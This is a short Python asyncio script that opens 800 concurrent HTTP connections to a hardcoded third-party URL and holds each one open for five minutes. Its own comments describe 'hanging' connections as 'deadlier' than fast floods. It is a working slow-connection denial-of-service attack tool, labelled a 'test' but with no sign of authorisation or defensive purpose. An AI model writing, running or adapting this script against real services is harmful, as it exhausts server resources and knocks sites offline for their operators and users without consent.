import aiohttp
import asyncio

TARGET_URL = 'https://share.google/tC1UhDAoiOHXyf1ji'  # Target URL to test against
MAX_CONNECTIONS = 800 # Even 500 "hanging" connections can be deadlier than 50,000 fast ones

async def hang_connection(session, i):
    try:
        # We start a request but don't finish it immediately
        async with session.get(TARGET_URL, timeout=300) as response:
            print(f"[*] Connection {i} opened and holding...", end='\r')
            # Stay alive for 5 minutes without closing
            await asyncio.sleep(300) 
    except Exception:
        pass

async def main():
    # We use a lower limit because holding connections consumes your local RAM/Sockets
    connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(hang_connection(session, i)) for i in range(MAX_CONNECTIONS)]
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Test stopped.")